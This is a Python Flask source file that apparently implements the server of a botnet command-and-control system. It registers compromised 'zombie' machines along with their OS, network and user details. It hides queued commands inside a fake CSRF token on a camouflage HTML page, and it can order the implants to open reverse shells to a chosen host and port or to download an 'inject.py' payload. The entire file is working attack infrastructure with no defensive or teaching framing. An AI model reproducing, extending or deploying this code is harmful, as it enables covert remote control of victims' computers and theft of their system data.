import hashlib
import json
import os
from base64 import b64decode, b64encode
from queue import Queue, Empty

import datetime
from flask import Flask, render_template, request, jsonify, Response
from peewee import IntegrityError, DoesNotExist

from models import Zombie, db_init

app = Flask(__name__)

hidden_command = '<input name=_csrf_token type=hidden ' \
                 'value="{}"> '
camo_html = 'camo.html'

dl_key = ''
valid = 0
SERVER_URL = 'http://dev-4.lan/'


@app.route("/")
def index():
    pass


@app.route("/dl/<key>")
def download(key):
    global dl_key
    global valid
    if key == dl_key:
        valid -= 1
        if not valid:
            dl_key = random_string(6)
            valid = 1
        print("dl key is", dl_key)
        with open('inject.py', 'rb') as f:
            return Response(f.read(), mimetype='text/plain',
                            headers={'Content-Disposition': 'attachment;'})


@app.route("/api", methods=['GET', 'POST'])
def api():
    if request.method == 'POST':
        if request.form['cmd'] == 'reverse':
            cmd = {'cmd': 'reverse', 'inet': int(request.form.get('inet', 2)),
                   'type': int(request.form.get('type', 1)), 'host': request.form['host'],
                   'port': int(request.form.get('port', 4444))
                   }
        elif request.form['cmd'] == 'update':
            cmd = {'cmd': 'update', 'url': request.form.get('url', SERVER_URL + "dl/" + dl_key)}
            global valid
            valid = len(Zombie.select())
        if cmd:
            if request.form.get('who', 'all') == 'all':
                for z in Zombie.select():
                    messages[z.id].put(cmd)
            else:
                messages[int(request.form['who'])].put(cmd)
        return '', 204
    return jsonify({'dl_key': dl_key,
                    'zombies': [z.get_dict() for z in Zombie.select()]})


def gen_uuid(form) -> str:
    for line in form.split('\n'):
        if 'ether' in line:
            m = hashlib.sha256(b'c2' + line.split()[1].encode())
            return b64encode(m.digest()).decode()


def random_string(length: int = 128) -> str:
    return b64encode(hashlib.sha256(os.urandom(128)).hexdigest()[:length].encode()).decode()


@app.route("/checkin")
def check_in():
    try:
        z = Zombie.get(uuid=request.args['k'].replace(' ', '+'))
    except DoesNotExist:
        pass
    else:
        print("Check-in from", z.uuid, "at", datetime.datetime.now())
        z.last_checkin = datetime.datetime.now()
        z.ip_addr = request.environ.get('HTTP_X_REAL_IP') or request.remote_addr
        z.save()
        try:
            cmd = messages[z.id].get_nowait()
            return render_template(camo_html, command=hidden_command.format(
                b64encode(json.dumps(cmd).encode()).decode()))
        except (Empty, KeyError):
            pass
    return render_template(camo_html, command=hidden_command.format(random_string()))


@app.route("/register", methods=['GET', 'POST'])
def register():
    post = json.loads(b64decode(request.stream.read()).decode())
    uuid = gen_uuid(post['i'])
    remote_addr = request.environ.get('HTTP_X_REAL_IP') or request.remote_addr
    try:
        Zombie.create(uuid=uuid, os=post['o'], ifconfig=post['i'],
                      uid=int(post['u']), uname=post['k'], ip_addr=remote_addr)
    except IntegrityError:
        print("Registration from existing zombie", uuid)
        pass
    else:
        print("Registration from new zombie", uuid)
    return render_template(camo_html, command=hidden_command.format(uuid))


if __name__ == "__main__":
    db_init()
    global dl_key
    dl_key = random_string(6)
    global valid
    valid = 1
    print("dl key is", dl_key)
    messages = {}
    for z in Zombie.select():
        messages[z.id] = Queue()
    app.run(debug=True)
